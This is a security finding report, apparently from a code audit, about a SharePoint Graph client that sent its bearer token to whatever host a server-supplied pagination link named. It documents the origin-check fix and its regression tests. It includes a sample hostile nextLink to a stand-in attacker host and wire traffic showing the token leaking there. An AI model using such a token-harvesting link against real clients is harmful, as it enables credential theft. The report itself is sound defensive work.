# R6-security_secrets-8 — `@odata.nextLink` is followed credentialed to an arbitrary host

**Severity:** major (cross-host bearer-token replay)
**Verdict:** CONFIRMED and FIXED.
**Site:** `packages/latence-source-sharepoint/src/latence_source_sharepoint/graph.py`
— `GraphClient._paginate` (followed the link) via `_get_json` → `_send(..., credentialed=True)`.

## What was wrong

`GraphClient._paginate` took the `@odata.nextLink` out of a Graph listing response body and
requested it through `_send` with `credentialed=True`, i.e. with
`Authorization: Bearer <tenant access token>` attached — with **no** check that the link points at
the configured `graph_base_url`.

That is the exact cross-host token replay the same module goes to great lengths to prevent on the
*other* server-supplied URL it follows. `transport.py`'s docstring names the threat explicitly for
the download leg ("urllib's default opener would follow it and re-send the `Authorization` header
to that host — a token leak") and mitigates it with `_NoRedirectHandler` plus an uncredentialed
re-issue (`graph.py` re-sends the `302` with `credentialed=False`). The pagination leg — also
server-supplied, also unvalidated, also potentially cross-host — was left credentialed.

`require_tls` does not cover it: it only checks the scheme, and an attacker's URL is perfectly
happy to be `https`. `redact_url` protects the *log*, not the wire.

## Failure scenario (reproduced)

A listing response body of
`{"value": [], "@odata.nextLink": "https://attacker.example.com/harvest?p=1"}`
made the client issue `GET https://attacker.example.com/harvest?p=1` with the bearer token.
Probe against the real `GraphClient` with a recording transport, pre-fix:

```
https://graph.microsoft.com/v1.0/drives/d1/root/children?$top=200 -> Bearer SUPER-SECRET-BEARER
https://attacker.example.com/harvest?p=1                          -> Bearer SUPER-SECRET-BEARER
```

Reachable from a hostile or compromised Graph-compatible endpoint, a misconfigured
`graph_base_url` (proxy / emulator), or a Graph response injection. No offline test covered it,
because the shipped `FakeGraphTransport` only ever emits a same-origin nextLink.

## What was built

* `transport.require_same_origin(url, *, expected, what)` + `transport.origin_of(url)` — the
  pagination-leg twin of the redirect guard, living next to `require_tls` in the module that
  already owns the connector's wire-level security properties. Origin = `(scheme, host, port)`
  with default ports normalised and the host lower-cased, so a cosmetic difference in how the
  server spelled its own URL is not mistaken for a foreign host. A mismatch raises a typed
  `ProviderError` (the *server's* response is wrong, not the operator's config), and the offending
  URL reaches the message only through `redact_url` (ADR-0034).
* `GraphClient._paginate` pins every `nextLink` to `self._base_url` **before** requesting it.
* Docstrings in both modules updated: `transport.py` now documents three enforced security
  properties, not two.

## Acceptance criteria

- [x] A server-supplied `@odata.nextLink` whose origin differs from the configured
      `graph_base_url` is never requested at all — not requested-then-discarded.
- [x] The refusal is a typed error (ADR-0034), carries no token, and redacts the link's query
      string.
- [x] The guard is an origin comparison, not a string prefix: a legitimate multi-page listing
      whose nextLink is spelled with an explicit `:443` or a differently-cased host still
      paginates (no security-guard-turned-outage).
- [x] Regression test `test_a_foreign_next_link_never_receives_the_bearer_token`
      (`packages/latence-source-sharepoint/tests/test_graph_client.py`), parametrised over a
      foreign host, a lookalike-suffix host, and a downgraded scheme. It asserts on the
      **recorded wire traffic** (the request was never made), not merely that an error was
      raised, and guards its own non-vacuity by first asserting the legitimate first page *was*
      fetched credentialed.
- [x] Observed FAILING pre-fix (`Failed: DID NOT RAISE any of (ProviderError, ConfigError)`, all
      three parametrisations) and passing post-fix.
- [x] `test_a_same_origin_next_link_spelled_differently_still_paginates` pins the
      non-over-strictness; it passes both pre- and post-fix, so it constrains the fix rather than
      the defect.
- [x] No test weakened or deleted; suite does not regress.
